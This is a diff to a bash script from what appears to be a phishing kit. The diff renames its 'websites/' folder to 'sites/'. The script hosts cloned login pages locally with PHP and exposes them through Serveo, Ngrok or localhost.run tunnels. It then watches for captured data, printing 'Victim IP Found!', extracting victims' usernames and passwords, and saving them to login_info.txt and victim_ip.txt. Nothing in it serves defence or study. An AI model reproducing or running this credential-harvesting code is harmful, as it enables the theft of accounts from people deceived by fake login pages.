@@ -186,11 +186,11 @@ start() {
     fi
 }
 start_s() {
-    if [[ -e websites/$server/ip.txt ]]; then
-    rm -rf websites/$server/ip.txt
+    if [[ -e sites/$server/ip.txt ]]; then
+    rm -rf sites/$server/ip.txt
     fi
-    if [[ -e websites/$server/usernames.txt ]]; then
-    rm -rf websites/$server/usernames.txt
+    if [[ -e sites/$server/usernames.txt ]]; then
+    rm -rf sites/$server/usernames.txt
     fi
     def_port="5555"
     printf "\e[0m\n"
@@ -202,7 +202,7 @@ start_s() {
 start_serveo() {
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-    cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
     sleep 2
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
@@ -219,11 +219,11 @@ start_serveo() {
     found
 }
 start_n() {
-    if [[ -e websites/$server/ip.txt ]]; then
-    rm -rf websites/$server/ip.txt
+    if [[ -e sites/$server/ip.txt ]]; then
+    rm -rf sites/$server/ip.txt
     fi
-    if [[ -e websites/$server/usernames.txt ]]; then
-    rm -rf websites/$server/usernames.txt
+    if [[ -e sites/$server/usernames.txt ]]; then
+    rm -rf sites/$server/usernames.txt
     fi
     if [[ -e ngrok ]]; then
     echo ""
@@ -256,7 +256,7 @@ start_n() {
     fi
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
-    cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+    cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
     sleep 2
     ./ngrok http 5555 > /dev/null 2>&1 &
     sleep 10
@@ -272,7 +272,7 @@ start_local(){
     port="${port:-${def_port}}"
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-    cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
     sleep 2
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
@@ -287,23 +287,23 @@ start_local(){
     printf "\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
     while [ true ]; do
-    if [[ -e "websites/$server/ip.txt" ]]; then
+    if [[ -e "sites/$server/ip.txt" ]]; then
     c_ip
-    rm -rf websites/$server/ip.txt
+    rm -rf sites/$server/ip.txt
     fi
     sleep 0.75
-    if [[ -e "websites/$server/usernames.txt" ]]; then
-    account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
+    if [[ -e "sites/$server/usernames.txt" ]]; then
+    account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
-    password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
+    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-    cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+    cat sites/$server/usernames.txt >> sites/$server/login_info.txt
     printf "\e[0m\n"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
     printf "\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
-    rm -rf websites/$server/usernames.txt
+    rm -rf sites/$server/usernames.txt
     fi
     sleep 0.75
     done
@@ -316,7 +316,7 @@ start_l() {
     port="${port:-${def_port}}"
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-    cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
     sleep 2
     printf "\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
@@ -328,43 +328,43 @@ found() {
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
     printf "\n"
     while [ true ]; do
-    if [[ -e "websites/$server/ip.txt" ]]; then
+    if [[ -e "sites/$server/ip.txt" ]]; then
     printf "\n"
     printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
     printf "\n"
     c_ip
-    rm -rf websites/$server/ip.txt
+    rm -rf sites/$server/ip.txt
     fi
     sleep 0.75
-    if [[ -e "websites/$server/usernames.txt" ]]; then
+    if [[ -e "sites/$server/usernames.txt" ]]; then
     printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\n"
     printf "\n"
     c_cred
-    rm -rf websites/$server/usernames.txt
+    rm -rf sites/$server/usernames.txt
     fi
     sleep 0.75
     done
 }
 c_ip() {
-    touch websites/$server/login_info.txt
-    ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+    touch sites/$server/login_info.txt
+    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
     IFS=$'\n'
-    ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
+    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
     printf "\e[0m\n"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/victim_ip.txt\e[0m\n" $server
     printf "\n"
-    cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
+    cat sites/$server/ip.txt >> sites/$server/victim_ip.txt
 }
 c_cred() {
-    account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
+    account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
-    password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
+    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-    cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+    cat sites/$server/usernames.txt >> sites/$server/login_info.txt
     printf "\e[0m\n"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
     printf "\n"
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
 }
